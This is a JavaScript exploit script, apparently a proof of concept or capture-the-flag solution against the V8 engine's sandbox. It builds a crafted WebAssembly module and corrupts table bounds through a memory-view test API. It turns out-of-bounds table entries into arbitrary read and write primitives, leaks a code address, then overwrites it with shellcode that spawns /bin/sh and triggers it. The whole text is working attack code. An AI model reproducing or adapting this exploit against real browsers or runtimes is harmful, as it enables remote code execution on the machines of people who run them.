let module = new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0,1,62,6,80,0,95,1,126,1,96,2,126,100,0,1,126,96,2,126,126,1,126,96,0,0,96,1,127,0,96,0,32,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,126,3,8,7,1,1,2,3,4,5,5,4,31,6,99,2,1,1,1,99,5,1,1,1,99,3,1,1,1,99,3,1,1,1,99,1,1,1,1,99,3,1,1,1,7,107,11,6,119,114,105,116,101,114,0,0,6,114,101,97,100,101,114,0,1,4,98,111,111,109,0,2,3,110,111,112,0,3,3,114,101,99,0,4,10,116,97,98,108,101,95,108,95,108,108,1,0,10,116,97,98,108,101,95,108,88,95,118,1,1,10,116,97,98,108,101,95,108,95,108,115,1,4,9,116,97,98,108,101,95,118,95,118,1,5,4,108,101,97,107,0,5,8,108,101,97,107,95,114,101,99,0,6,12,1,0,10,143,1,7,12,0,32,1,32,0,251,5,0,0,66,0,11,8,0,32,1,251,2,0,0,11,11,0,32,1,32,0,65,0,17,2,0,11,2,0,11,87,0,2,64,32,0,65,1,107,34,0,69,13,0,32,0,16,4,66,239,155,175,205,248,172,209,145,1,66,239,155,175,205,248,172,209,145,17,126,66,239,155,175,205,248,172,209,145,33,126,66,239,155,175,205,248,172,209,145,49,126,66,239,155,175,205,248,172,209,145,193,0,126,66,239,155,175,205,248,172,209,145,209,0,126,26,11,11,7,0,65,0,17,5,1,11,8,0,65,48,16,4,16,5,11,0,56,4,110,97,109,101,1,49,7,0,6,119,114,105,116,101,114,1,6,114,101,97,100,101,114,2,4,98,111,111,109,3,3,110,111,112,4,3,114,101,99,5,4,108,101,97,107,6,8,108,101,97,107,95,114,101,99]));
let instance = new WebAssembly.Instance(module);
let { writer, reader, dummy, boom, nop, rec, leak_rec, table_l_ls, table_v_v } = instance.exports;

const kHeapObjectTag = 1;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

function unlock_table(table) {
  setField(getPtr(table), 0x10, 0xfffffffe);
  setField(getPtr(table), 0x14, 0xfffffffe);
}

unlock_table(table_v_v);
table_v_v.set(0xfffffff9, nop);

const MASK64 = (1n<<64n)-1n;
leak_rec();
let leaks = leak_rec();
for (let i = 0; i < (leaks.length < 0x10 ? leaks.length : 0x10); i++) {
  console.log(i, (leaks[i] & MASK64).toString(16));
}

unlock_table(table_l_ls);
function read(ptr) {
  table_l_ls.set(0xfffffff9, reader);
  return boom(ptr - 0x7n, ptr - 0x7n) & MASK64;
}
function write(ptr, val) {
  table_l_ls.set(0xfffffff9, writer);
  boom(ptr - 0x7n, val);
}

const tgt = leaks[6];
const sc = [
  0x6e69622fb848686an,
  0xe7894850732f2f2fn,
  0x2434810101697268n,
  0x6a56f63101010101n,
  0x894856e601485e08n,
  0x50f583b6ad231e6n
];
for (let i = 0; i < sc.length; i++) {
  write(tgt + BigInt(i) * 8n, sc[i]);
}
for (let i = sc.length; i < 0x50 / 8; i++) {
  write(tgt + BigInt(i) * 8n, 0x9090909090909090n);
}
rec(2);
console.log(`[+] shellcode triggered!`);    // unreachable, we got shell
